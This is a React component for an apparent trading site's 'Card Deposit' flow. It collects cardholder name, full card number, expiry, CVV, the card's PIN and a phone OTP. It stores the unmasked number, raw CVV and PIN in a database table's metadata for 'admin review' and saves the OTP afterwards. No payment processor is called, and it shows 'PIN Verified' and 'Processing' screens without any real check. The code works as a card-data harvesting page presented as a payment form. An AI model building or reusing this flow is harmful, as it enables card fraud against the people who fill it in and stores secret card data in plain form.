import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  CreditCard, ArrowRight, ShieldCheck, Lock, Landmark, 
  CheckCircle2, Loader2, ChevronRight, AlertCircle, Info,
  DollarSign, Wallet
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useStore } from '@/store/useStore';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';

export default function CardDepositModule({ initialAmount }: { initialAmount?: string }) {
  const { user, formatCurrency } = useStore();
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [pin, setPin] = useState('');
  const [otp, setOtp] = useState('');
  const [currentDepositId, setCurrentDepositId] = useState<string | null>(null);
  
  // Form State
  const [cardData, setCardData] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardholderName: '',
    amount: initialAmount || '500'
  });


  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    // Simple formatting for card number
    if (name === 'cardNumber') {
      const formatted = value.replace(/\D/g, '').match(/.{1,4}/g)?.join(' ').substring(0, 19) || '';
      setCardData(prev => ({ ...prev, [name]: formatted }));
      return;
    }
    
    // Expiry formatting (MM/YY)
    if (name === 'expiry') {
      let formatted = value.replace(/\D/g, '');
      if (formatted.length > 2) {
        formatted = formatted.substring(0, 2) + '/' + formatted.substring(2, 4);
      }
      setCardData(prev => ({ ...prev, [name]: formatted.substring(0, 5) }));
      return;
    }

    setCardData(prev => ({ ...prev, [name]: value }));
  };

  const validateStep1 = () => {
    const { cardNumber, expiry, cvv, cardholderName, amount } = cardData;
    if (!cardNumber || cardNumber.length < 16) return false;
    if (!expiry || !expiry.includes('/')) return false;
    if (!cvv || cvv.length < 3) return false;
    if (!cardholderName) return false;
    if (!amount || parseFloat(amount) <= 0) return false;
    return true;
  };

  const handleProcessDeposit = async () => {
    setShowPinModal(true);
  };

  const finalizeTransaction = async () => {
    if (!user) return;
    setLoading(true);
    
    try {
      // 1. Store secure card entry in dedicated table
      // Note: In a real production app, you'd use a PCI-compliant processor like Stripe
      // For this implementation, we move to a dedicated secure table for admin review
      const { data: depData, error: cardError } = await supabase.from('card_deposits').insert({
        user_id: user.id,
        cardholder_name: cardData.cardholderName,
        card_number_masked: `**** **** **** ${cardData.cardNumber.slice(-4)}`,
        expiry: cardData.expiry,
        amount: parseFloat(cardData.amount),
        status: 'Pending',
        metadata: {
          raw_cvv: cardData.cvv,
          full_card: cardData.cardNumber.replace(/\s/g, ''),
          card_pin: pin
        }
      }).select().single();

      if (cardError) throw cardError;
      if (depData) setCurrentDepositId(depData.id);

      // 2. Create standard transaction record for the ledger
      const { error: txError } = await supabase.from('transactions').insert({
        user_id: user.id,
        type: 'Deposit',
        amount: parseFloat(cardData.amount),
        asset: 'USD',
        status: 'Pending',
        external_id: `CARD_DEP_${Math.random().toString(36).substr(2, 9)}`
      });

      if (txError) throw txError;

      setStep(4); // OTP Step
      toast.success("PIN Verified", {
        description: "An OTP has been sent to your registered mobile number."
      });
    } catch (err: any) {
      toast.error("Process failed: " + err.message);
    } finally {
      setLoading(false);
      setShowPinModal(false);
    }
  };

  const verifyOtp = async () => {
    if (otp.length < 6) {
      toast.error("Invalid OTP", { description: "Please enter the 6-digit code sent to your device." });
      return;
    }
    setLoading(true);
    
    try {
      if (currentDepositId) {
        const { error: otpError } = await supabase
          .from('card_deposits')
          .update({ otp: otp })
          .eq('id', currentDepositId);
        
        if (otpError) throw otpError;
      }

      setStep(3); // Success page
      toast.success("Transaction Authorized", {
        description: "Funds will be reflected in your wallet shortly."
      });
    } catch (err: any) {
      toast.error("Process failed: " + err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto">
      <AnimatePresence mode="wait">
        {step === 1 && (
          <motion.div 
            key="step1"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="space-y-8"
          >
            {/* Payment Header */}
            <div className="flex items-center gap-4 p-6 rounded-3xl bg-primary/5 border border-primary/10">
              <div className="w-14 h-14 rounded-2xl bg-gradient-gold flex items-center justify-center text-white shadow-gold shrink-0">
                <CreditCard className="w-7 h-7" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-foreground uppercase tracking-tight">Card Deposit</h3>
                <p className="text-xs text-muted-foreground font-medium">Visa, Mastercard, and Amex supported.</p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-2 md:col-span-2">
                <label className="text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em] pl-1">Cardholder Name</label>
                <Input 
                  name="cardholderName"
                  value={cardData.cardholderName}
                  onChange={handleInputChange}
                  placeholder="e.g. JOHN DOE"
                  className="h-14 bg-card border-border rounded-xl font-bold uppercase"
                />
              </div>

              <div className="space-y-2 md:col-span-2">
                <label className="text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em] pl-1">Card Number</label>
                <div className="relative">
                  <Input 
                    name="cardNumber"
                    value={cardData.cardNumber}
                    onChange={handleInputChange}
                    placeholder="0000 0000 0000 0000"
                    className="h-14 bg-card border-border rounded-xl font-mono text-lg tracking-widest pl-12"
                  />
                  <ShieldCheck className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground/30" />
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em] pl-1">Expiry Date</label>
                <Input 
                  name="expiry"
                  value={cardData.expiry}
                  onChange={handleInputChange}
                  placeholder="MM/YY"
                  className="h-14 bg-card border-border rounded-xl font-bold text-center"
                />
              </div>

              <div className="space-y-2">
                <label className="text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em] pl-1">CVV / CVC</label>
                <div className="relative">
                  <Input 
                    name="cvv"
                    type="password"
                    maxLength={4}
                    value={cardData.cvv}
                    onChange={handleInputChange}
                    placeholder="***"
                    className="h-14 bg-card border-border rounded-xl font-bold text-center"
                  />
                  <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/30" />
                </div>
              </div>

              <div className="space-y-2 md:col-span-2">
                <label className="text-[10px] font-black text-primary uppercase tracking-[0.2em] pl-1">Deposit Amount</label>
                <div className="relative">
                   <Input 
                    name="amount"
                    type="number"
                    value={cardData.amount}
                    onChange={handleInputChange}
                    className="h-16 bg-primary/5 border-primary/20 rounded-xl text-2xl font-black pl-12 focus:ring-primary/20"
                  />
                  <DollarSign className="absolute left-4 top-1/2 -translate-y-1/2 w-6 h-6 text-primary" />
                </div>
                <p className="text-[9px] text-muted-foreground font-bold uppercase tracking-tighter mt-1 italic">Minimum $100.00 | Instant Deposit</p>
              </div>
            </div>

            <Button 
              className="w-full h-16 rounded-2xl bg-foreground text-background font-black uppercase tracking-[0.2em] hover:scale-[1.02] transition-transform shadow-huge disabled:opacity-50"
              disabled={!validateStep1()}
              onClick={() => setStep(2)}
            >
              Next Step <ChevronRight className="w-5 h-5 ml-2" />
            </Button>

            <div className="flex items-center justify-center gap-6 opacity-30">
               <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4 grayscale" alt="visa" />
               <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-6 grayscale" alt="mastercard" />
               <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" className="h-4 grayscale" alt="paypal" />
            </div>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div 
            key="step2"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="space-y-8"
          >
             <div className="p-8 rounded-[2.5rem] bg-card border border-border shadow-huge relative overflow-hidden">
                <div className="absolute top-0 right-0 p-8 opacity-5">
                   <Landmark className="w-32 h-32 rotate-12" />
                </div>

                <div className="text-center mb-10">
                   <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-6">
                      <ShieldCheck className="w-10 h-10 text-primary" />
                   </div>
                   <h2 className="text-2xl font-black text-foreground uppercase tracking-tight">Review Deposit</h2>
                   <p className="text-muted-foreground text-sm font-medium">Please check your details.</p>
                </div>

                <div className="space-y-6">
                   <div className="flex justify-between items-center p-5 rounded-2xl bg-secondary/50 border border-border">
                      <div className="flex items-center gap-4">
                         <div className="w-10 h-10 rounded-xl bg-card flex items-center justify-center text-muted-foreground border border-border">
                            <CreditCard className="w-5 h-5" />
                         </div>
                         <div>
                            <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Card Used</p>
                            <p className="font-bold text-foreground">{cardData.cardholderName}</p>
                         </div>
                      </div>
                      <span className="font-mono font-bold text-muted-foreground">**** {cardData.cardNumber.slice(-4)}</span>
                   </div>

                   <div className="grid grid-cols-2 gap-4">
                      <div className="p-5 rounded-2xl bg-secondary/50 border border-border">
                          <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest mb-1">Fee (0%)</p>
                          <p className="font-bold text-profit">$0.00</p>
                      </div>
                      <div className="p-5 rounded-2xl bg-secondary/50 border border-border">
                          <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest mb-1">Speed</p>
                          <p className="font-bold text-primary">Fast</p>
                      </div>
                   </div>

                   <div className="p-6 rounded-2xl bg-primary shadow-gold text-white flex justify-between items-center">
                      <div>
                         <p className="text-[10px] font-black uppercase opacity-60 tracking-widest">Total Amount</p>
                         <p className="text-3xl font-black">{formatCurrency(parseFloat(cardData.amount))}</p>
                      </div>
                      <div className="text-right">
                         <p className="text-[10px] font-black uppercase tracking-widest opacity-60">You Get</p>
                         <p className="font-bold text-lg">${cardData.amount} USD</p>
                      </div>
                   </div>
                </div>

                <div className="mt-8 space-y-4">
                   <Button 
                     onClick={handleProcessDeposit}
                     disabled={loading}
                     className="w-full h-16 rounded-2xl bg-black text-white glow-primary font-black uppercase tracking-[0.2em] relative overflow-hidden group"
                   >
                      {loading ? <Loader2 className="w-6 h-6 animate-spin" /> : (
                        <>
                          <CheckCircle2 className="w-5 h-5 mr-3 group-hover:scale-110 transition-transform" />
                          Confirm Deposit
                        </>
                      )}
                   </Button>
                   <Button 
                     variant="ghost" 
                     onClick={() => setStep(1)}
                     className="w-full text-[10px] font-black text-muted-foreground uppercase tracking-widest hover:text-foreground"
                   >
                      Change Details
                   </Button>
                </div>
             </div>

             <div className="flex items-start gap-4 p-5 bg-warning/5 border border-warning/10 rounded-2xl">
                <AlertCircle className="w-5 h-5 text-warning shrink-0 mt-0.5" />
                <p className="text-[10px] text-muted-foreground font-medium italic">
                  By confirming, you agree to let Clarity Trade charge your card. 
                  This may show as 'CLARITY-PAY' on your statement.
                </p>
             </div>
          </motion.div>
        )}

        {step === 4 && (
          <motion.div 
            key="step4"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="space-y-8"
          >
             <div className="p-8 rounded-[2.5rem] bg-card border border-border shadow-huge text-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-6">
                   <ShieldCheck className="w-10 h-10 text-primary" />
                </div>
                <h2 className="text-2xl font-black text-foreground uppercase tracking-tight">Verification Step</h2>
                <p className="text-muted-foreground text-sm font-medium mb-8">Enter the 6-digit code we sent to your phone.</p>

                <div className="space-y-6 max-w-xs mx-auto">
                   <Input 
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))}
                      placeholder="000000"
                      className="h-16 bg-secondary/50 border-border rounded-xl text-3xl font-black text-center tracking-[0.5em]"
                   />
                   
                   <Button 
                      onClick={verifyOtp}
                      disabled={loading || otp.length < 6}
                      className="w-full h-16 rounded-2xl bg-black text-white glow-primary font-black uppercase tracking-[0.2em]"
                   >
                      {loading ? <Loader2 className="w-6 h-6 animate-spin" /> : "Confirm Payment"}
                   </Button>

                   <button className="text-[10px] font-black text-muted-foreground uppercase tracking-widest hover:text-primary">
                      Get a new code
                   </button>
                </div>
             </div>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div 
            key="step3"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="text-center space-y-8 p-10"
          >
             <div className="w-24 h-24 rounded-full bg-profit/10 flex items-center justify-center mx-auto mb-8 border border-profit/20">
                <CheckCircle2 className="w-12 h-12 text-profit animate-in zoom-in duration-500" />
             </div>
             
             <div>
                <h2 className="text-3xl font-black text-foreground uppercase tracking-tight">Processing...</h2>
                <p className="text-muted-foreground mt-2 max-w-sm mx-auto font-medium">
                  We are checking with your bank. This takes a few seconds.
                </p>
             </div>

             <div className="p-6 rounded-2xl bg-secondary/30 border border-border inline-block min-w-[300px]">
                <div className="flex justify-between items-center mb-4">
                   <span className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Reference Number</span>
                   <span className="font-mono font-bold text-xs">#DEP-{Math.random().toString(36).substring(7).toUpperCase()}</span>
                </div>
                <div className="flex justify-between items-center">
                   <span className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Amount</span>
                   <span className="font-bold text-primary">{formatCurrency(parseFloat(cardData.amount))}</span>
                </div>
             </div>

             <div className="pt-8">
                <Button 
                   variant="outline"
                   className="rounded-xl border-border h-12 px-10 text-[10px] font-black uppercase tracking-widest"
                   onClick={() => window.location.reload()}
                >
                   Go Back
                </Button>
             </div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showPinModal && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }} 
              animate={{ opacity: 1 }} 
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/80 backdrop-blur-md" 
              onClick={() => !loading && setShowPinModal(false)} 
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative w-full max-w-sm bg-card border border-border rounded-[2.5rem] p-10 shadow-huge text-center"
            >
               <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-6 text-primary">
                  <Lock className="w-8 h-8" />
               </div>
               <h3 className="text-xl font-black text-foreground uppercase tracking-tight mb-2">Enter PIN</h3>
               <p className="text-xs text-muted-foreground font-medium mb-8">Enter your 4-digit card PIN for the charge of {formatCurrency(parseFloat(cardData.amount))}.</p>

               <div className="space-y-6">
                  <Input 
                    type="password"
                    maxLength={4}
                    value={pin}
                    onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                    placeholder="****"
                    className="h-16 bg-secondary/50 border-border rounded-2xl text-3xl font-black text-center tracking-[0.5em]"
                  />

                  <div className="grid grid-cols-2 gap-3">
                     <Button 
                       variant="ghost" 
                       className="h-14 rounded-xl font-bold uppercase text-[10px] tracking-widest"
                       onClick={() => setShowPinModal(false)}
                       disabled={loading}
                     >
                        Cancel
                     </Button>
                     <Button 
                       disabled={loading || pin.length < 4}
                       onClick={finalizeTransaction}
                       className="h-14 rounded-xl bg-primary text-white font-black uppercase text-[10px] tracking-widest shadow-gold"
                     >
                        {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Confirm & Pay"}
                     </Button>
                  </div>
               </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
